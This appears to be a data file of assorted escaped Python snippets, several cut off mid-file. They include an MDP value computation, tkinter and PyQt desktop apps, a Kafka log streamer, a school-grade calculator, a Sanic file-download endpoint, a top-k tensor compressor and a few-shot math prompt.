state_to_idx[s_next]  # \u4e0b\u4e00\u4e2a\u72b6\u6001\u7d22\u5f15\n                        # \u66f4\u65b0\u8f6c\u79fb\u77e9\u9635\n                        P_mrp[i][j] += pi_prob * P[p_key]\n\n    return P_mrp\n\n\nP_mrp = compute_state_transition_matrix(S, A, P, Pi_1)\nprint(P_mrp)\n\n\n# MDP\u7684\u72b6\u6001\u4ef7\u503c\u51fd\u6570\u53ef\u4ee5\u8f6c\u5316\u4e3aMRP\u7684\u4ef7\u503c\u51fd\u6570\ngamma = 0.5\n# \u8f6c\u5316\u540e\u7684MRP\u7684\u72b6\u6001\u8f6c\u79fb\u77e9\u9635\nP_from_mdp_to_mrp = [\n    [0.5, 0.5, 0.0, 0.0, 0.0],\n    [0.5, 0.0, 0.5, 0.0, 0.0],\n    [0.0, 0.0, 0.0, 0.5, 0.5],\n    [0.0, 0.1, 0.2, 0.2, 0.5],\n    [0.0, 0.0, 0.0, 0.0, 1.0],\n]\nP_from_mdp_to_mrp = np.array(P_from_mdp_to_mrp)\nR_from_mdp_to_mrp = [-0.5, -1.5, -1.0, 5.5, 0]\n\nV = compute_v(P_from_mdp_to_mrp, R_from_mdp_to_mrp, gamma, 5)\nprint(\"MDP\u4e2d\u6bcf\u4e2a\u72b6\u6001\u4ef7\u503c\u5206\u522b\u4e3a\\n\", V)\n",
    "import tkinter as tk\r\nfrom tkinter import ttk, messagebox, scrolledtext\r\nimport sqlite3\r\nimport string\r\nimport random\r\nimport re\r\nfrom urllib.parse import urlparse\r\nimport webbrowser\r\nimport pyperclip\r\nimport datetime\r\nimport requests\r\nfrom threading import Thread\r\nimport qrcode # type: ignore\r\nfrom PIL import Image, ImageTk\r\nimport io\r\n\r\nclass URLShortenerGUI:\r\n    def __init__(self, root):\r\n        self.root = root\r\n        self.root.title(\"Advanced URL Shortener\")\r\n        self.root.geometry(\"800x600\")\r\n        \r\n        # Initialize the database\r\n        self.shortener = URLShortener()\r\n        \r\n        # Create main notebook for tabs\r\n        self.notebook = ttk.Notebook(root)\r\n        self.notebook.pack(expand=True, fill='both', padx=10, pady=5)\r\n        \r\n        # Create tabs\r\n        self.create_shorten_tab()\r\n        self.create_history_tab()\r\n        self.create_analytics_tab()\r\n        self.create_settings_tab()\r\n        \r\n        # Style configuration\r\n        style = ttk.Style()\r\n        style.configure('TButton', padding=5)\r\n        style.configure('TLabel', padding=5)\r\n        \r\n    def create_shorten_tab(self):\r\n        shorten_frame = ttk.Frame(self.notebook)\r\n        self.notebook.add(shorten_frame, text='Shorten URL')\r\n        \r\n        # URL Entry\r\n        url_frame = ttk.Frame(shorten_frame)\r\n        url_frame.pack(fill='x', padx=10, pady=5)\r\n        \r\n        ttk.Label(url_frame, text=\"Enter Long URL:\").pack(side='left')\r\n        self.url_entry = ttk.Entry(url_frame)\r\n        self.url_entry.pack(side='left', fill='x', expand=True, padx=5)\r\n        \r\n        # Custom Short Code Option\r\n        custom_frame = ttk.Frame(shorten_frame)\r\n        custom_frame.pack(fill='x', padx=10, pady=5)\r\n        \r\n        self.custom_var = tk.BooleanVar()\r\n        ttk.Checkbutton(custom_frame, text=\"Use Custom Short Code\", \r\n                       variable=self.custom_var, \r\n                       command=self.toggle_custom_entry).pack(side='left')\r\n        \r\n        self.custom_entry = ttk.Entry(custom_frame, state='disabled')\r\n        self.custom_entry.pack(side='left', fill='x', expand=True, padx=5)\r\n        \r\n        # Buttons\r\n        btn_frame = ttk.Frame(shorten_frame)\r\n        btn_frame.pack(fill='x', padx=10, pady=5)\r\n        \r\n        ttk.Button(btn_frame, text=\"Shorten URL\", \r\n                  command=self.shorten_url).pack(side='left', padx=5)\r\n        ttk.Button(btn_frame, text=\"Generate QR Code\", \r\n                  command=self.generate_qr).pack(side='left', padx=5)\r\n        \r\n        # Result Frame\r\n        self.result_frame = ttk.LabelFrame(shorten_frame, text=\"Result\")\r\n        self.result_frame.pack(fill='both', expand=True, padx=10, pady=5)\r\n        \r\n        self.short_url_label = ttk.Label(self.result_frame, text=\"\")\r\n        self.short_url_label.pack(pady=5)\r\n        \r\n        self.qr_label = ttk.Label(self.result_frame)\r\n        self.qr_label.pack(pady=5)\r\n        \r\n    def create_history_tab(self):\r\n        history_frame = ttk.Frame(self.notebook)\r\n        self.notebook.add(history_frame, text='URL History')\r\n        \r\n        # Search Frame\r\n        search_frame = ttk.Frame(history_frame)\r\n        search_frame.pack(fill='x', padx=10, pady=5)\r\n        \r\n        ttk.Label(search_frame, text=\"Search:\").pack(side='left')\r\n        self.search_entry = ttk.Entry(search_frame)\r\n        self.search_entry.pack(side='left', fill='x', expand=True, padx=5)\r\n        self.search_entry.bind('<KeyRelease>', self.search_urls)\r\n        \r\n        # Treeview for URL history\r\n        columns = ('Long URL', 'Short Code', 'Created At', 'Clicks')\r\n        self.tree = ttk.Treeview(history_frame, columns=columns, show='headings')\r\n        \r\n        for col in columns:\r\n            self.tree.heading(col, text=col)\r\n            self.tree.column(col, width=150)\r\n        \r\n        self.tree.pack(fill='both', expand=True, padx=10, pady=5)\r\n        \r\n        # Buttons\r\n        btn_frame = ttk.Frame(history_frame)\r\n        btn_frame.pack(fill='x', padx=10, pady=5)\r\n        \r\n        ttk.Button(btn_frame, text=\"Copy URL\", \r\n                  command=self.copy_url).pack(side='left', padx=5)\r\n        ttk.Button(btn_frame, text=\"Delete Selected\", \r\n                  command=self.delete_url).pack(side='left', padx=5)\r\n        ttk.Button(btn_frame, text=\"Refresh\", \r\n                  command=self.refresh_history).pack(side='left', padx=5)\r\n        \r\n        self.refresh_history()\r\n        \r\n    def create_analytics_tab(self):\r\n        analytics_frame = ttk.Frame(self.notebook)\r\n        self.notebook.add(analytics_frame, text='Analytics')\r\n        \r\n        # Statistics Frame\r\n        stats_frame = ttk.LabelFrame(analytics_frame, text=\"Statistics\")\r\n        stats_frame.pack(fill='x', padx=10, pady=5)\r\n        \r\n        self.total_urls_label = ttk.Label(stats_frame, text=\"Total URLs: 0\")\r\n        self.total_urls_label.pack(pady=5)\r\n        \r\n        self.total_clicks_label = ttk.Label(stats_frame, text=\"Total Clicks:",
    "import time\nimport json\nimport logging\nimport random\nimport subprocess\nfrom kafka import KafkaProducer\nfrom dotenv import load_dotenv\nimport os\nfrom contextlib import closing\n\n# Load environment variables\nload_dotenv()\n\n# Configure logging\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(asctime)s - %(levelname)s - %(message)s',\n    handlers=[\n        logging.FileHandler(\"stream_logs.log\"),\n        logging.StreamHandler()\n    ]\n)\n\nclass LogStreamer:\n    def __init__(self):\n        # Load configuration from environment variables\n        self.kafka_bootstrap_servers = os.getenv('KAFKA_BOOTSTRAP_SERVERS', 'localhost:29092')\n        self.kafka_topic = os.getenv('KAFKA_TOPIC', 'hadoop-logs')\n        self.hdfs_path = os.getenv('HDFS_PATH', '/logs/hadoop-logs.log')\n\n        # Initialize Kafka producer\n        try:\n            self.producer = KafkaProducer(\n                bootstrap_servers=self.kafka_bootstrap_servers,\n                value_serializer=lambda v: json.dumps(v).encode('utf-8')\n            )\n            logging.info(\"Kafka producer initialized.\")\n        except Exception as e:\n            logging.error(f\"Failed to initialize Kafka producer: {e}\")\n            raise\n\n    def read_hdfs_file(self, hdfs_path):\n        \"\"\"Stream file from HDFS using hdfs dfs -cat command via subprocess.\"\"\"\n        cmd = f\"docker-compose exec namenode hdfs dfs -cat {hdfs_path}\"\n        try:\n            with subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, text=True) as proc:\n                for line in proc.stdout:\n                    yield line.strip()\n        except Exception as e:\n            logging.error(f\"Error reading HDFS file: {e}\")\n            return\n\n    def stream_logs(self, min_delay=1, max_delay=3):\n        \"\"\"Stream logs from HDFS file with random delay between messages.\"\"\"\n        logging.info(f\"Streaming logs from HDFS path: {self.hdfs_path}\")\n        try:\n            for line in self.read_hdfs_file(self.hdfs_path):\n                if not line:\n                    continue  # Skip empty lines\n                \n                # Remove line numbers if present (e.g., \"123|\")\n                if '|' in line:\n                    line = line.split('|', 1)[1].strip()\n\n                # Send log to Kafka\n                self.producer.send(self.kafka_topic, {'log': line})\n                self.producer.flush()\n                logging.info(f\"Sent to Kafka topic '{self.kafka_topic}': {line}\")\n\n                # Random delay between messages\n                delay = random.uniform(min_delay, max_delay)\n                time.sleep(delay)\n        except KeyboardInterrupt:\n            logging.info(\"Log streaming interrupted by user.\")\n        except Exception as e:\n            logging.error(f\"Unexpected error during log streaming: {e}\")\n        finally:\n            self.close_producer()\n\n    def close_producer(self):\n        \"\"\"Close Kafka producer gracefully.\"\"\"\n        if self.producer:\n            self.producer.close()\n            logging.info(\"Kafka producer closed.\")\n\nif __name__ == \"__main__\":\n    # Initialize and run the log streamer\n    try:\n        streamer = LogStreamer()\n        logging.info(\"Starting log streaming...\")\n        streamer.stream_logs(min_delay=1, max_delay=3)\n    except Exception as e:\n        logging.error(f\"Fatal error: {e}\")",
    "import sys\nimport os\n\nfrom PyQt6.QtWidgets import QApplication, QMainWindow, QWidget, QFileDialog\n\nfrom Pkg.Write import Ui_Write\nfrom Pkg.FrontPage import Ui_FrontPage\nfrom Pkg.About import Ui_Form\n\nclass MainWindow(QMainWindow, Ui_FrontPage):\n    def __init__(self, parent=None):\n        super().__init__(parent)\n        \n        self.setupUi(self)  # Setup the UI for the front page\n        self.show()  # Show the front page window\n        \n        # Initialize the Write window, but don't show it yet\n        self.WriteGUI = MainWrite(self)\n        self.AboutGUI = MainAbout(self)\n\n        # Connect the buttons to their respective methods\n        self.About.clicked.connect(self.AboutGUI.gotoAbout)\n        self.New.clicked.connect(self.WriteGUI.gotoNew)\n        self.Open.clicked.connect(self.WriteGUI.gotoOpen)\n\nclass MainAbout(QWidget, Ui_Form):\n    def __init__(self, parent=None):\n        super().__init__(parent)\n        self.setupUi(self)  # Setup the UI for the About window\n        \n        # This flag will help in checking whether the About window is already open\n        self.is_open = False\n\n    def gotoAbout(self):\n        if not self.is_open:\n            self.AboutWindow = QWidget()\n            self.AboutUi = Ui_Form()\n            self.AboutUi.setupUi(self.AboutWindow)\n            self.AboutWindow.show()\n            self.is_open = True\n        else:\n            # If the About window is already open, bring it to the front\n            self.AboutWindow.raise_()\n            self.AboutWindow.activateWindow()\n\nclass MainWrite(QMainWindow, Ui_Write):\n    def __init__(self, parent=None):\n        super().__init__(parent)\n        self.setupUi(self) # Set up the UI for the Write window\n        \n        self.AboutGUI = None\n        \n        self.actionNew.triggered.connect(self.gotoNew)\n        self.actionOpen.triggered.connect(self.OpenFileDialog)\n        self.actionSave.triggered.connect(self.SaveFileDialog)\n        self.actionSave_As.triggered.connect(self.SaveAsFileDialog)\n\n        #Edit\n\n        self.actionWrap_Lines.toggled.connect(self.warpLine)\n\n        #Help\n        self.actionAbout.triggered.connect(self.showAboutWindow)\n        self.actionLicense.triggered.connect(self.gotoLicense)\n\n    def showAboutWindow(self):\n        # Create the About window only when the action is triggered\n        if self.AboutGUI is None:\n            self.AboutGUI = MainAbout(self)  # Create only once when needed\n        self.AboutGUI.gotoAbout()\n\n    def gotoLicense(self):\n        # Show the Write window when the Write button is clicked\n        f = open(os.getcwd() + \"/LICENSE.md\", 'r')\n        file_content = f.read()\n        self.plainTextEdit.setPlainText(file_content)\n        self.plainTextEdit.setReadOnly(True)\n        self.setWindowTitle(\"LICENSE - Noted.\")\n                \n    def gotoNew(self):\n        # Show the Write window when the Write button is clicked\n        self.write_window = MainWrite(self)\n        self.write_window.show()  # Show the MainWrite window\n\n    def gotoOpen(self):\n        # Show the Write window when the Write button is clicked\n        self.show()\n        self.OpenFileDialog()\n\n    def warpLine(self):\n        if self.actionWrap_Lines.isChecked() == True:\n            self.plainTextEdit.setLineWrapMode() == 1\n        else:\n            self.plainTextEdit.setLineWrapMode() == 0\n\n    def OpenFileDialog(self):\n        # Create a file dialog and configure it\n        file_dialog = QFileDialog(self)\n        file_dialog.setWindowTitle(\"Open File\")\n        file_dialog.setFileMode(QFileDialog.FileMode.ExistingFile)\n        file_dialog.setViewMode(QFileDialog.ViewMode.List)\n        file_dialog.setAcceptMode(QFileDialog.AcceptMode.AcceptOpen)\n\n        # Execute the dialog and check if a file was selected\n        if file_dialog.exec():\n            selected_files = file_dialog.selectedFiles()\n            if selected_files:\n                with open(selected_files[0], 'r') as f:\n                    file_content = f.read()\n                    name_title = os.path.basename(str(selected_files[0]))\n                    self.plainTextEdit.setPlainText(file_content)\n                    self.setWindowTitle(name_title + \" - Noted.\")\n                    self.actionSave.setEnabled(True)\n                    self.plainTextEdit.setReadOnly(False)\n                    print(os.getcwd())\n                    print(selected_files)\n             \n    def SaveFileDialog(self):\n        f = open(selected_files[0], 'x')\n        f.write(str(self.plainTextEdit.toPlainText()))   \n        print(os.path.basename(str(selected_files[0])))\n                \n    def SaveAsFileDialog(self):\n        # Create a file dialog and configure it\n        file_dialog = QFileDialog(self)\n        file_dialog.setWindowTitle(\"Save File\")\n        file_dialog.setFileMode(QFileDialog.FileMode.AnyFile)\n        file_dialog.setViewMode(QFileDialog.ViewMode.List)\n        file_dialog.setAcceptMode(QFileDialog.AcceptMode.AcceptSave)\n        \n        # Execute the dialog and",
    "import customtkinter\r\nfrom datetime import date\r\nimport os.path\r\nfrom Connection import ConnectToEd, ConnectToEdPart2, AskForNotes # type: ignore\r\nimport pickle\r\nimport base64\r\n\r\n\r\npath = \"IdentifiantsED.conf\"\r\n\r\n    \r\ndef Save(data):\r\n    with open(path, 'w') as file:\r\n        pickle.dump(data, file)\r\n\r\ndef Config():\r\n    file = open(path, \"a\")\r\n    file.close()\r\n    if os.path.getsize(path) > 0:\r\n        with open(path, 'rb') as file:\r\n            Logins = pickle.load(file)\r\n            Questions(ConnectToEd(Logins[0], Logins[1]))\r\n        return    \r\n\r\n\r\ncustomtkinter.set_appearance_mode(\"light\")\r\ncustomtkinter.set_default_color_theme(\"dark-blue\")\r\n\r\nroot = customtkinter.CTk()\r\nroot.geometry(\"1000x700\")\r\n\r\ndef ConnectionCallback(Token):\r\n    if(RemindMe.get() == 1):\r\n        with open(path, 'wb') as file:\r\n            pickle.dump([username, pswd], file)\r\n    QuestionFrame.destroy()\r\n    PeriodFrame = customtkinter.CTkFrame(master=frame, width = 400, height=200)\r\n    PeriodFrame.pack(pady=20, padx=30, fill=\"both\", expand=False)\r\n    PeriodLabel = customtkinter.CTkLabel(master=PeriodFrame, text=\"Choisissez la p\u00e9riode\")\r\n    PeriodLabel.pack(pady=15)\r\n    RawPeriods = GetPeriod(AskForNotes(Token))\r\n    RawPeriods.append([\"Toute l'ann\u00e9e\", None])\r\n    FormattedPeriods = [x[0] for x in RawPeriods]\r\n    optionmenu = customtkinter.CTkOptionMenu(master=PeriodFrame, values=FormattedPeriods)\r\n    optionmenu.pack(pady=40)\r\n    ConfirmButton = customtkinter.CTkButton(master=PeriodFrame, text=\"Calculer la moyenne\", command=lambda: GetNotesForPeriod(Token, optionmenu.get(), PeriodFrame))\r\n    ConfirmButton.pack(pady=60)\r\n\r\ndef GetNotesForPeriod(Token, Period, ToDestroy):\r\n    codePeriod = \"\"\r\n    for element in GetPeriod(AskForNotes(Token)):\r\n        if element[0] == Period:\r\n            codePeriod = element[1]\r\n            break\r\n    AllNotes = AskForNotes(Token)[\"notes\"]\r\n    NotesFromPeriod = {}\r\n    if codePeriod == \"\": #No period found, let's take all notes\r\n        for note in AllNotes:\r\n            if note[\"codeMatiere\"] in NotesFromPeriod:\r\n                NotesFromPeriod[note[\"codeMatiere\"]].append([float(note[\"valeur\"]), float(note[\"noteSur\"])]) #Maybe add coeff here (bruh the franglais)\r\n            else:\r\n                NotesFromPeriod.update({note[\"codeMatiere\"]:[[float(note[\"valeur\"]), float(note[\"noteSur\"])]]})\r\n    else:\r\n        for note in AllNotes:\r\n            if note[\"codePeriode\"] == codePeriod:\r\n                note[\"valeur\"] = note[\"valeur\"].replace(\",\", \".\")\r\n                if note[\"codeMatiere\"] in NotesFromPeriod:\r\n                    NotesFromPeriod[note[\"codeMatiere\"]].append([float(note[\"valeur\"]), float(note[\"noteSur\"])]) #Maybe add coeff here (bruh the franglais)\r\n                else:\r\n                    NotesFromPeriod.update({note[\"codeMatiere\"]:[[float(note[\"valeur\"]), float(note[\"noteSur\"])]]})\r\n    Moyenne(NotesFromPeriod, ToDestroy)\r\n\r\n\r\n\r\ndef Questions(data):\r\n    DecodedQuestion = base64.b64decode(data[\"question\"])\r\n    DecodedPurpositions = []\r\n    for proposition in data[\"propositions\"]:\r\n        DecodedPurpositions.append(base64.b64decode(proposition))\r\n    global username, pswd\r\n    username, pswd = str(UsernameEntry.get()), str(PasswordEntry.get()) \r\n    frame4.destroy()\r\n    global QuestionFrame\r\n    QuestionFrame = customtkinter.CTkFrame(master=frame, width = 400, height=200)\r\n    QuestionFrame.pack(pady=20, padx=30, fill=\"both\", expand=False)\r\n    QuestionLabel = customtkinter.CTkLabel(master=QuestionFrame, text=DecodedQuestion)\r\n    QuestionLabel.pack(pady=15)\r\n    optionmenu = customtkinter.CTkOptionMenu(master=QuestionFrame, values=DecodedPurpositions)\r\n    optionmenu.pack(pady=40)\r\n    ConfirmButton = customtkinter.CTkButton(master=QuestionFrame, text=\"Confirmer\", command=lambda: ConnectionCallback(ConnectToEdPart2(base64.b64encode(optionmenu.get()))))\r\n    ConfirmButton.pack(pady=60)\r\n\r\n\r\ndef GetPeriod(Notes):\r\n    Periods = []\r\n    for Period in Notes[\"periodes\"]:\r\n        if Period[\"periode\"] != \"Relev\u00e9 \" and Period[\"periode\"] != \"Ann\u00e9e\": #The space after Relev\u00e9 is normal, it'in the ED version\r\n            Periods.append([Period[\"periode\"], Period[\"codePeriode\"]])\r\n    return Periods\r\n\r\n\r\ndef Moyenne(NotesFromPeriod, ToDestroy = None):\r\n    if ToDestroy != None:\r\n        ToDestroy.destroy()\r\n    AllMoyennes = []\r\n    for matiere in NotesFromPeriod:\r\n        NotesSum = 0\r\n        NotesCount = 0\r\n        for note in NotesFromPeriod[matiere]:\r\n            NotesSum += note[0]*(20/note[1])\r\n            NotesCount += 1\r\n        AllMoyennes.append(NotesSum/NotesCount)\r\n    MoyenneG = 0\r\n    MoyennesCount = 0\r\n    for moyenne in AllMoyennes:\r\n        MoyenneG += moyenne\r\n        MoyennesCount += 1\r\n    MoyenneG = MoyenneG / MoyennesCount\r\n    label.configure(text=f\"Moyenne pour la p\u00e9riode: {round(MoyenneG, 2)}\")\r\n\r\n        \r\nframe = customtkinter.CTkFrame(master=root)\r\nframe.pack(pady=20, padx=30, fill=\"both\", expand=True)\r\n\r\nframe2 = customtkinter.CTkFrame(master=fram",
    "from io import BytesIO\nfrom sanic.exceptions import BadRequest, NotFound\nfrom sanic.response import HTTPResponse\nfrom sanic.response.convenience import raw\nfrom sanic.request import Request\nfrom typing import overload\nfrom utils import MyAPI\nfrom zipfile import ZipFile, ZIP_DEFLATED\nfrom zlib import decompress\n\n@overload\nasync def download_paste_by_id(app: MyAPI, paste_id: str) -> HTTPResponse:\n    \"Download all files under the given `paste_id`.\"\n\n@overload\nasync def download_paste_by_id(app: MyAPI, paste_id: str, filepos: int) -> HTTPResponse:\n    \"Download a single file at position `filepos` under the given `paste_id`.\"\n\nasync def download_paste_by_id(app: MyAPI, paste_id: str, filepos: int = 0) -> HTTPResponse:\n    \"\"\"\n    Download a group of files (as a `.zip`) or a single file\n    (as whatever the extension is) from the database.\n    \n    The `.zip` file is built in memory from database rows\n    and then dispatched through a HTTP response as a file.\n\n    Parameters\n    ----------\n    app: `MyAPI`\n        the app currently running.\n    paste_id: `str`\n        the ID of the paste to download.\n    filepos: `int`\n        the specific file to download. If\n        left out, this gets _all_ files.\n    \n    Returns\n    -------\n    `HTTPResponse`\n        the file containing the requested\n        data to then be download.\n    \n    Raises\n    ------\n    `BadRequest`\n        some arguments were invalid.\n    `NotFound`\n        no paste was found with the given ID.\n    \"\"\"\n    \n    if filepos < 0:\n        raise BadRequest(\"'filepos' cannot be less than zero.\")\n    \n    # User wants to download a single file\n    if filepos:\n        async with app.ctx.pool.acquire() as conn:\n            req = await conn.execute(\n                \"\"\"\n                SELECT filename, content FROM files\n                WHERE id = ? AND position = ?\n                \"\"\",\n                paste_id, filepos\n            )\n            \n            row = await req.fetchone()\n        \n        if not row:\n            raise NotFound(f\"No file at index {filepos} for paste {paste_id} found.\")\n\n        return raw(\n            decompress(row[\"content\"]).decode(),\n            headers = {\n                \"Content-Disposition\": f'attachment; filename=\"{row[\"filename\"] or f'{paste_id}-{row[filepos]}.txt'}\"'\n            }\n        )\n\n    # ================================================================================================\n\n    # User wants to download all files\n    async with app.ctx.pool.acquire() as conn:\n        req = await conn.execute(\"SELECT filename, content, position FROM files WHERE id = ?\", paste_id)\n        rows = await req.fetchall()\n    \n    if not rows:\n        raise NotFound(f\"No files were found with the paste ID '{paste_id}'.\")\n\n    buffer = BytesIO()\n    \n    with ZipFile(buffer, \"w\", ZIP_DEFLATED, False) as myzip: # type: ignore\n        for row in rows:\n            filename = row[\"filename\"] or f\"{paste_id}-{row[\"position\"]}\"\n\n            with myzip.open(filename, \"w\") as file:\n                file.write(decompress(row[\"content\"]))\n    \n    return raw(\n        buffer.getvalue(),\n        headers = {\n            \"Content-Disposition\": f'attachment; filename=\"{paste_id}.zip\"'\n        }\n    )",
    "# -*- coding: utf-8 -*-\n\n# Form implementation generated from reading ui file 'tomato.ui'\n#\n# Created by: PyQt5 UI code generator 5.15.10\n#\n# WARNING: Any manual changes made to this file will be lost when pyuic5 is\n# run again.  Do not edit this file unless you know what you are doing.\n\n\nfrom PyQt5 import QtCore, QtGui, QtWidgets\n\n\nclass Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        MainWindow.setObjectName(\"MainWindow\")\n        MainWindow.resize(640, 360)\n        self.centralwidget = QtWidgets.QWidget(MainWindow)\n        self.centralwidget.setObjectName(\"centralwidget\")\n        self.widget = QtWidgets.QWidget(self.centralwidget)\n        self.widget.setGeometry(QtCore.QRect(0, 0, 640, 260))\n        self.widget.setObjectName(\"widget\")\n        self.text = QtWidgets.QLabel(self.widget)\n        self.text.setGeometry(QtCore.QRect(60, 10, 551, 71))\n        self.text.setStyleSheet(\"QLabel {\\n\"\n\"    font-size: 50px;\\n\"\n\"}\")\n        self.text.setObjectName(\"text\")\n        self.time_remain = QtWidgets.QLabel(self.widget)\n        self.time_remain.setGeometry(QtCore.QRect(190, 110, 251, 111))\n        self.time_remain.setStyleSheet(\"QLabel {\\n\"\n\"    font-size: 100px;\\n\"\n\"}\")\n        self.time_remain.setObjectName(\"time_remain\")\n        self.widget_2 = QtWidgets.QWidget(self.centralwidget)\n        self.widget_2.setGeometry(QtCore.QRect(0, 260, 640, 100))\n        self.widget_2.setObjectName(\"widget_2\")\n        self.button_finish = QtWidgets.QPushButton(self.widget_2)\n        self.button_finish.setEnabled(False)\n        self.button_finish.setGeometry(QtCore.QRect(320, 0, 160, 100))\n        self.button_finish.setStyleSheet(\"QPushButton {\\n\"\n\"        background-color: rgba(255, 255, 255, 50);\\n\"\n\"        border: none;\\n\"\n\"    }\\n\"\n\"    QPushButton:hover {\\n\"\n\"        background-color: rgba(255, 255, 255, 80);  \\n\"\n\"        color: #002fa7;\\n\"\n\"        border: 1px solid white;\\n\"\n\"    }\\n\"\n\"    QPushButton:pressed {\\n\"\n\"        background-color: rgba(255, 255, 255, 100);\\n\"\n\"    }\")\n        self.button_finish.setObjectName(\"button_finish\")\n        self.button_setbackground = QtWidgets.QPushButton(self.widget_2)\n        self.button_setbackground.setGeometry(QtCore.QRect(480, 0, 160, 100))\n        self.button_setbackground.setStyleSheet(\"QPushButton {\\n\"\n\"        background-color: rgba(255, 255, 255, 50);\\n\"\n\"        border: none;\\n\"\n\"    }\\n\"\n\"    QPushButton:hover {\\n\"\n\"        background-color: rgba(255, 255, 255, 80);  \\n\"\n\"        color: #002fa7;\\n\"\n\"        border: 1px solid white;\\n\"\n\"    }\\n\"\n\"    QPushButton:pressed {\\n\"\n\"        background-color: rgba(255, 255, 255, 100);\\n\"\n\"    }\")\n        self.button_setbackground.setObjectName(\"button_setbackground\")\n        self.button_start = QtWidgets.QPushButton(self.widget_2)\n        self.button_start.setEnabled(True)\n        self.button_start.setGeometry(QtCore.QRect(0, 0, 160, 100))\n        self.button_start.setBaseSize(QtCore.QSize(0, 0))\n        self.button_start.setStyleSheet(\"QPushButton {\\n\"\n\"        background-color: rgba(255, 255, 255, 50);\\n\"\n\"        border: none;\\n\"\n\"    }\\n\"\n\"    QPushButton:hover {\\n\"\n\"        background-color: rgba(255, 255, 255, 80);  \\n\"\n\"        color: #002fa7;\\n\"\n\"        border: 1px solid white;\\n\"\n\"    }\\n\"\n\"    QPushButton:pressed {\\n\"\n\"        background-color: rgba(255, 255, 255, 100);\\n\"\n\"    }\")\n        self.button_start.setObjectName(\"button_start\")\n        self.button_stop = QtWidgets.QPushButton(self.widget_2)\n        self.button_stop.setEnabled(False)\n        self.button_stop.setGeometry(QtCore.QRect(160, 0, 160, 100))\n        self.button_stop.setStyleSheet(\"QPushButton {\\n\"\n\"        background-color: rgba(255, 255, 255, 50);\\n\"\n\"        border: none;\\n\"\n\"    }\\n\"\n\"    QPushButton:hover {\\n\"\n\"        background-color: rgba(255, 255, 255, 80);  \\n\"\n\"        color: #002fa7;\\n\"\n\"        border: 1px solid white;\\n\"\n\"    }\\n\"\n\"    QPushButton:pressed {\\n\"\n\"        background-color: rgba(255, 255, 255, 100);\\n\"\n\"    }\")\n        self.button_stop.setObjectName(\"button_stop\")\n        MainWindow.setCentralWidget(self.centralwidget)\n\n        self.retranslateUi(MainWindow)\n        QtCore.QMetaObject.connectSlotsByName(MainWindow)\n\n    def retranslateUi(self, MainWindow):\n        _translate = QtCore.QCoreApplication.translate\n        MainWindow.setWindowTitle(_translate(\"MainWindow\", \"MainWindow\"))\n        self.text.setText(_translate(\"MainWindow\", \"\u5df2\u5b8c\u6210 10 \u6b21\u756a\u8304\u65f6\u95f4\"))\n        self.time_remain.setText(_translate(\"MainWindow\", \"25:00\"))\n        self.button_finish.setText(_translate(\"MainWindow\", \"\u7ed3\u675f\"))\n        self.button_setbackground.setText(_translate(\"MainWindow\", \"\u8bbe\u7f6e\u80cc\u666f\"))\n        self.button_start.setText(_translate(\"MainWindow\", \"\u5f00\u59cb\"))\n        self.button_stop.setText(_translate(\"MainWindow\", \"\u6682\u505c\"))\n",
    "# _*_ coding: utf-8 _*_\n# This file is created by C. Zhang for personal use.\n# @Time         : 25/03/2024 20:21\n# @Author       : C. Zhang\n# @File         : topk.py\n# @Affiliation  : Shandong University\nimport torch\nimport sys\nsys.path.append('../../')\nfrom fedgcc.compressor import Compressor\n\n\ndef sparsify(tensor, compress_ratio):\n    tensor = tensor.flatten()\n    k = max(1, int(tensor.numel() * compress_ratio))\n    _, indices = torch.topk(tensor.abs(), k, sorted=False,)\n    values = torch.gather(tensor, 0, indices)\n    return values, indices\n\n\ndef desparsify(tensors, numel):\n    values, indices = tensors\n    tensor_decompressed = torch.zeros(numel, dtype=values.dtype, layout=values.layout, device=values.device)\n    tensor_decompressed.scatter_(0, indices, values)\n    return tensor_decompressed\n\n\nclass TopKCompressor(Compressor):\n\n    def __init__(self, compress_ratio):\n        super().__init__()\n        self.compress_ratio = compress_ratio\n\n    def compress(self, tensor, name=None):\n        tensors = sparsify(tensor, self.compress_ratio)\n        ctx = tensor.numel(), tensor.size()\n        return tensors, ctx\n\n    def decompress(self, tensors, ctx):\n        \"\"\"Decompress by filling empty slots with zeros and reshape back using the original shape\"\"\"\n        numel, shape = ctx\n        tensor_decompressed = desparsify(tensors, numel)\n        return tensor_decompressed.view(shape)",
    "system_prompt = \"\"\n\n\nfew_shot_prompt = \"\"\"Problem:\nFind the domain of the expression $\\\\frac{\\sqrt{x-2}}{\\sqrt{5-x}}$.\n\nSolution:\nThe expressions inside each square root must be non-negative. Therefore, $x-2 \\ge 0$, so $x\\ge2$, and $5 - x \\ge\n0$, so $x \\le 5$. Also, the denominator cannot be equal to zero, so $5-x>0$, which gives $x<5$. Therefore, the\ndomain of the expression is $\\\\boxed{[2,5)}$.\nThe answer is: $[2,5)$.\n\nProblem:\nIf $\\det \\mathbf{A} = 2$ and $\\det \\mathbf{B} = 12,$ then find $\\det (\\mathbf{A} \\mathbf{B}).$\n\nSolution:\nWe have that $\\det (\\mathbf{A} \\mathbf{B}) = (\\det \\mathbf{A})(\\det \\mathbf{B}) = (2)(12) = \\\\boxed{24}.$\nThe answer is: $24$.\n\nProblem:\nTerrell usually lifts two 20-pound weights 12 times. If he uses two 15-pound weights instead, how many times\nmust Terrell lift them in order to lift the same total weight?\n\nSolution:\nIf Terrell lifts two 20-pound weights 12 times, he lifts a total of $2\\cdot 12\\cdot20=480$ pounds of weight. If he\nlifts two 15-pound weights instead for $n$ times, he will lift a total of $2\\cdot15\\cdot n=30n$ pounds of weight.\n\nEquating this to 480 pounds, we can solve for $n$:\n\\\\begin{align*}\n30n&=480\\\\\n\\Rightarrow\\qquad n&=480/30=\\\\boxed{16}\n\\end{align*}\nThe answer is: $16$.\n\nProblem:\nIf the system of equations\n\\\\begin{align*}\n6x-4y&=a,\\\\\n6y-9x &=b.\n\\end{align*} has a solution $(x, y)$ where $x$ and $y$ are both nonzero, find $\\\\frac{a}{b},$ assuming $b$ is\nnonzero.\n\nSolution:\nIf we multiply the first equation by $-\\\\frac{3}{2}$, we obtain $$6y-9x=-\\\\frac{3}{2}a.$$ Since we also know that\n$6y-9x=b$, we have $$-\\\\frac{3}{2}a=b\\Rightarrow\\\\frac{a}{b}=\\\\boxed{-\\frac{2}{3}}.$$\nThe answer is: $-\\\\frac{2}{3}$.\n\n\"\"\"\n\n# question_format = \"\"\"Problem:\n# 